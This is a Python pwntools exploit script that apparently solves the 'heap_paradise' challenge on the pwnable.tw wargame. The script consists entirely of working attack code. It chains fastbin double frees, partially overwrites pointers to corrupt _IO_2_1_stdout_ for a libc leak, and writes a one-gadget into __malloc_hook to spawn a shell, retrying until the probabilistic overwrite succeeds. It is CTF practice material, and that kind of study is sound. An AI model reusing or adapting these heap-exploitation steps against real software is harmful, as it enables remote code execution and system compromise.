from pwn import *
context.arch = 'amd64'
#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./heap_paradise")
elf = ELF(pwn_file, checksec=False)
libc = ELF("./libc_64.so.6", checksec=False)

def add(size, data):
    r.sendlineafter("Choice:", '1')
    r.sendlineafter("Size :", str(size))
    r.sendafter("Data :", data)

def dele(idx):
    r.sendlineafter("Choice:", '2')
    r.sendlineafter("Index :", str(idx))

while True:
    try:
        r = remote("chall.pwnable.tw", 10308)
        add(0x68, '\x00'*0x58 + p64(0x71))  #0
        add(0x68, '\x00'*0x58 + p64(0x71))  #1
        add(0x68, '\x00'*0x18 + p64(0x51))  #2

        # double free to construct unsorted bin
        dele(2)
        dele(0)
        dele(2)
        add(0x68, '\x60')                   #3
        add(0x68, 'a')                      #4
        add(0x68, 'a')                      #5
        add(0x68, p64(0)+p64(0x91))         #6

        # construct _IO_2_1_stdout
        dele(1)
        add(0x68, '\xdd'+'\x85')

        # double free to modify _IO_2_1_stdout to leak libc
        dele(0)
        dele(6)
        dele(0)
        add(0x68, '\x00'*0x58 + p64(0x71) + '\x70')     # IMPORTANT! To change NEXT heap's fd. Thus save an 'add' count.
        add(0x68, 'a')      
        add(0x68, 'a')      
        add(0x68, '\x00\x00\x00' + 6 * p64(0) + p64(0xfbad1800) + p64(0) * 3 + '\x00')

        r.recv(0x40)
        a = u64(r.recv(8)) - 0x3c5600 + 0x1000
        libc.address = a

        # double free to get shell
        dele(0)
        dele(6)
        dele(0)
        add(0x68, p64(libc.sym['__malloc_hook'] - 0x23))
        add(0x68, 'a')
        add(0x68, 'a')
        add(0x68, '\x00'*0x13 + p64(a + 0xef6c4))
        
        dele(0)
        dele(0)
    except:
        print "Wrong"
        r.close()
        continue
    else:
        print "OK"
        break

r.interactive()